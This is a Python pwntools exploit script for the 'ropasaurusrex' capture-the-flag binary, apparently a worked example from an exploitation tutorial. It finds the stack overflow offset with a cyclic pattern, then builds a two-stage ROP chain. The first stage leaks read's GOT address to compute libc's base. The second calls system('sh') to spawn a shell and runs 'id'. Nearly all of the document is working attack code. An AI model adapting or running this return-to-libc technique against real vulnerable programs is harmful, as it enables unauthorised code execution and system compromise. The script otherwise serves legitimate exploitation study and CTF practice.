#!/usr/bin/env python
from pwn import *

binary = './ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d'

# Remote version
l = listen(0)
l.spawn_process([binary])
r = remote('localhost', l.lport)

# Uncomment for local version
# r = process(binary)

#
# If we run with a cyclic pattern, we end up with the following state:
#
# $ cyclic 999 > input
# $ gdb ./ropasaurusrex
# $ run < input
# ...
# EBP: 0x6261616a (b'jaab')
# ESP: 0xffffc7e0 ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\310\377\377\030\226\004\b\030\202\004\b")
# EIP: 0x6261616b (b'kaab')
#
# Let's generate a bit of padding to get us up to the edge of EIP control.
#
padding = cyclic(cyclic_find('kaab'))

#
# Load the library and libc from disk
#
rex  = ELF(binary)
libc = ELF(next(path for path in rex.libs if 'libc' in path))

#
# Write out the address of a libc routine so that we can calculate
# the base address of libc, then re-run the vulnerable routine so
# we can exploit.
#
rop1 = ROP(rex)
rop1.write(1, rex.got['read'], 4)
rop1.call(0x80483F4)

stage1 = padding + str(rop1)
log.info("Stage 1 Rop:\n%s" % rop1.dump())
log.info("Stage 1 Payload:\n%s" % hexdump(stage1))

r.send(stage1)

libc_read = u32(r.recv(4))
log.info("%#x libc read" % libc_read)

#
# Stage 2 we do system('sh').
#
# While we can write 'sh' to lots of places, it's easy enough
# to just fine one in libc.
#
read_offset  = libc.symbols['read'] - libc.address
libc.address = libc_read - read_offset

rop2 = ROP([rex,libc])
rop2.system(next(libc.search('sh\x00')))

stage2 = padding + str(rop2)
log.info("Stage 2 Rop:\n%s" % rop2.dump())
log.info("Stage 2 Payload:\n%s" % hexdump(stage2))

r.send(stage2)

#
# Can haz shell?
#
r.sendline('id')
log.success(r.recvrepeat().strip())
